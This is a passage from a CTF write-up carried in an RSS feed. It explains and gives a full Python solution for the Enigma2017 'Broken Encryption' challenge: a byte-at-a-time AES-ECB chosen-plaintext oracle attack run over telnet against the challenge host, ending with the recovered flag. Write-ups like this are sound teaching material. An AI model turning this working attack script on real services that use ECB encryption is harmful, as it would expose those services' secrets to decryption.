and so on, and so on... up to 255 guesses per byte and as many bytes as we need to discover
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In practical terms, we can try guessing only in the ASCII range of 0x20-0x7E or so, since we expect the secret in this case to be plaintext (the &amp;ldquo;flag&amp;rdquo;). This will speed things up by more than double.&lt;/p&gt;

&lt;h2 id=&#34;putting-it-all-togther-a-solution-in-python&#34;&gt;Putting it All Togther: A Solution in Python&lt;/h2&gt;

&lt;p&gt;Knowing what to do is half the battle. The other half is coding it up and tearing your hair out over data alignment issues and dynamic typing issues.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Enigma2017 CTF, &amp;quot;Broken Encryption&amp;quot;

import sys
import time       # for using a delay in network connections
import telnetlib  # don&#39;t try using raw sockets, you&#39;ll tear your hair out trying to send the right line feed character

__author__ = &#39;michael-myers&#39;

# TODO: I&#39;m interested in any more elegant way to block-slice a Python string like this.
# Split out every 16-byte (32-hex char) block of returned ciphertext:
def parse_challenge(challenge):
    ciphertext_blocks = [challenge[0:32], challenge[32:64], challenge[64:96],
                         challenge[96:128], challenge[128:160], challenge[160:192],
                         challenge[192:224], challenge[224:]]
    return ciphertext_blocks


# To attack AES-ECB, we will be exploiting the following facts:
#   * we do not know all of the plaintext but we control a substring of it.
#	* the controlled portion is at a known offset within the string.
#   * by varying our input length we can force the secret part onto a block boundary.
#   * we can choose our substring to be a full block of padding &amp;amp; align it at a boundary.
#   * if the message ends at a block boundary, the last 16-byte block will be all padding.
#   * thus we know when the secret part is block aligned; we&#39;ll see the same ciphertext.
#   * there is no nonce or IV or counter, so ciphertext is deterministic.
#   * by varying length of plaintext we can align the secret part such that there 
#		is only one unknown byte at a time being encrypted in the final block of output. 
#	* by varying one byte at a time, we can brute-force guess input blocks until we
#       match what we see in the final block, thus giving us one byte of the secret.
#   * we will limit our guesses to the ASCII range 0x20-0x7E for this particular challenge.
#
# Begin by changing the 2nd block of plaintext to n100000000000000, where n is a guess. 
# If the ciphertext[2nd block] == ciphertext[7th block] then the guess is correct,
# otherwise increment n.
def main():
    # If the Engima2017 servers are still up: enigma2017.hackcenter.com 7945
    if len(sys.argv) &amp;lt; 3:   # lol Python doesn&#39;t have an argc
        print &#39;Usage : python CTF-Challenge-Response.py hostname port&#39;
        sys.exit()
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    guessed_secret = &amp;quot;&amp;quot;

    # Our input pads to the end of the 1st block, then aligns a guess at block 2.
    # Because we need to constantly alter this value, we are making it a bytearray. 
    # Strings in Python are immutable and inappropriate to use for holding data.
    chosen_plaintext = bytearray(&amp;quot;0123456789&amp;quot; + &amp;quot;1000000000000000&amp;quot;)

    # Guess each byte of the secret, in succession, by manipulating the 2nd plaintext
    # block (bytes 10 through 26) and looking for a matched ciphertext in the final block:
    for secret_bytes_to_guess in range(0, 64):
        # Add in a new guessing byte at the appropriate position:
        chosen_plaintext.insert(10, &amp;quot;?&amp;quot;)

        # Guess over and over different values until we get this byte:
        for guessed_byte in range(0x20, 0x7E):  # this is the printable ASCII range.
            chosen_plaintext[10] = chr(guessed_byte)

            tn = telnetlib.Telnet(&amp;quot;enigma2017.hackcenter.com&amp;quot;, 7945)
            tn.read_until(&amp;quot;Agent number: &amp;quot;)

            # Telnet input MUST BE DELIVERED with a \r\n line ending. If you send
            # only the \n the remote end will silently error on your input and send back
            # partially incorrect ciphertext! Untold hours debugging that bullshit.
            # Here we carefully convert the bytearray to ASCII and then to a string type, 
            # or else telnetlib barfs because of the hell that is dynamic typing.
            send_string = str(chosen_plaintext.decode(&#39;ascii&#39;) + &amp;quot;\r\n&amp;quot;)
            tn.write(send_string)

            challenge = tn.read_all()
            tn.close()
            # time.sleep(0.5)   # (optional) rate-limit if you&#39;re worried about getting banned.

            ciphertext_blocks = parse_challenge(challenge)
            print &amp;quot;Currently guessing: &amp;quot; + chosen_plaintext[10:26]  # 2nd block holds the guess
            print &amp;quot;Chosen vs. final ciphertext blocks: &amp;quot; + ciphertext_blocks[1] + &amp;quot; &amp;lt;- ? -&amp;gt; &amp;quot; + ciphertext_blocks[6]

            # We&#39;re always guessing in the 2nd block and comparing result vs the 7th block:
            if ciphertext_blocks[1] == ciphertext_blocks[6]:
                print &amp;quot;Guessed a byte of the secret: &amp;quot; + chr(guessed_byte)
                guessed_secret = chr(guessed_byte) + guessed_secret
                break   # Finish the inner loop immediately, back up to the outer loop.

    print &amp;quot;All guessed bytes: &amp;quot; + guessed_secret

    print(&amp;quot;Done&amp;quot;)


if __name__ == &amp;quot;__main__&amp;quot;:
    main()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And, after all of this, we uncover the flag: &lt;code&gt;54368eae12f64b2451cc234b0f327c7e_ECB_is_the_w0rst&lt;/code&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>